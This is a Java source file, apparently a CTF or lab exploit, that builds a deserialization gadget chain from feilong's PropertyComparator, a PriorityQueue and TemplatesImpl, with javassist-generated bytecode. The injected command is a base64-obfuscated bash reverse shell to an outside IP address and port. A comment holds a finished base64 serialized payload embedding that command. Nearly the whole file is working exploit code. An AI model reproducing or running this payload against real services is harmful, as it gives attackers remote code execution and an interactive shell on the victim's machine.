package org.dawn.meguru;

import com.feilong.core.util.comparator.PropertyComparator;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class Exp {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesImpl1 = getTemplatesImpl(genPayload("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIuNzQuODkuNTgvMzczNjAgMD4mMQ==}|{base64,-d}|{bash,-i}"));
        TemplatesImpl templatesImpl2 = new TemplatesImpl();

        PropertyComparator propertyComparator1 = new PropertyComparator("outputProperties");

        PriorityQueue priorityQueue1 = new PriorityQueue(2, propertyComparator1);
        setFieldValue(priorityQueue1, "size", 2);
        Object[] objectsjdk = {templatesImpl1, templatesImpl2};
        setFieldValue(priorityQueue1, "queue", objectsjdk);

        byte[] bytes = serialize(priorityQueue1);
        String data = Base64.getEncoder().encodeToString(bytes);
        System.out.println(data);
//        byte[] decode = Base64.getDecoder().decode(data);
//        deserialize(decode);
// rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAM2NvbS5mZWlsb25nLmNvcmUudXRpbC5jb21wYXJhdG9yLlByb3BlcnR5Q29tcGFyYXRvctQnpe7yzUzMAgADTAAKY29tcGFyYXRvcnEAfgABTAAMcHJvcGVydHlOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAbcHJvcGVydHlWYWx1ZUNvbnZlcnRUb0NsYXNzdAARTGphdmEvbGFuZy9DbGFzczt4cHB0ABBvdXRwdXRQcm9wZXJ0aWVzcHcEAAAAA3NyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4ABEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABs8r+ur4AAAAyABgBAAFyBwABAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAAwEABjxpbml0PgEAAygpVgEABENvZGUMAAUABgoABAAIAQARamF2YS9sYW5nL1J1bnRpbWUHAAoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAMAA0KAAsADgEAYWJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1USXVOelF1T0RrdU5UZ3ZNemN6TmpBZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0IABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAClNvdXJjZUZpbGUBAAZyLmphdmEAIQACAAQAAAAAAAEAAQAFAAYAAQAHAAAAGgACAAEAAAAOKrcACbgADxIRtgAVV7EAAAAAAAEAFgAAAAIAF3B0AAZSQU5ET01wdwEAeHNxAH4ACAAAAAD/////cHBwcHcBAHh4

    }

    // 反射setter getter
    public static void setFieldValue(Object obj, String name, Object val) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, val);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Class clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field.get(obj);
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }

    // 序列化
    public static byte[] serialize(Object object) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(object);
        return baos.toByteArray();
    }

    public static Object deserialize(byte[] byteArray) throws Exception{
        ByteArrayInputStream bais = new ByteArrayInputStream(byteArray);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }

    // 恶意类生成，使用TemplatesImpl加载
    public static byte[] genPayload(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("r");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(50);
        return clazz.toBytecode();
    }

    public static TemplatesImpl getTemplatesImpl(byte[] byteCode) throws Exception {
        byte[][] bytes = new byte[][]{byteCode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", bytes);
        setFieldValue(templates, "_name", "RANDOM");
        setFieldValue(templates, "_tfactory", null);
        return templates;
    }
}
